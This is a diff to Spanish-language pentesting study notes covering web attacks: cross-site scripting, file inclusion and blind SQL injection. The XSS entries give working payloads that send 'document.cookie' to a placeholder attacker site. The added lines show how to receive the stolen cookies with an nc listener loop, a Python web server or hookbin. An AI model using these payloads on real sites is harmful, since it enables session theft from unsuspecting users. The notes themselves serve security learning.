@@ -329,9 +329,13 @@ Anthares101@kali:~$ hashcat -m 13400 -a 0 -w 1 fichero diccionario --force --sho
 
 ## Ataques
 
-- **Cross-site scripting:** Inyección de código Javascript malicioso en una página. Muy útil para este utilizar https://hookbin.com/
+- **Cross-site scripting:** Inyección de código Javascript malicioso en una página:
 	- Un payload bastante silencioso (no hace ninguna redirección) sería usando AJAX: `<script>let request = new XMLHttpRequest();request.open('GET', 'atackerSite?'+document.cookie, true);request.send();</script>`
 	- Otro payload: `<script>new Image().src = 'atackerSite/flag.php?'+document.cookie;</script>`
+	- Como apunte final, para escuchar las peticiones hay varias opciones:
+		- **`nc`:** para esto pues recomiendo hacer : `while [ 1 -eq 1 ]; do sudo nc -lnvp 80; done` porque después de cada petición se cierra
+		- Con el comando `sudo python3 -m http.server 80` podeis montar un servidor web en la raíz en el directorio donde estéis.
+		- Otra opción es usar https://hookbin.com/. Podreis crear endpoints y monitorizar las peticiones (Es el más simple de todos vaya)
 - **Inclusión de archivos remotos:** Se utiliza en la url el parámetro `page` para ver de que pagina se hace el include y que se cargue un archivo de otro sitio. Se puede ejecutar un `webshell` para controlar y ver todo lo que hay en el server
 - **Ataques de inclusión de ficheros locales:** Incluir dentro de la pagina web un fichero local, sitios de plantillas o descargas expuestos. Por ejemplo, cuando se pasa por url el fichero que se quiere utilizar para algo. Si no se acota a lo que puede acceder el servidor web, se puede acceder a archivos del propio Linux o Windows donde esta alojada la pagina.
 - **Sql injection:** Existe un tipo de sql injection que es a ciegas. Es decir, los errores de la base de datos o la info no sale por pantalla y es necesario usar logica binaria (true / false) y poner que si un usuario existe, esperar x segundos. `sqlmap` automatiza todo esto:
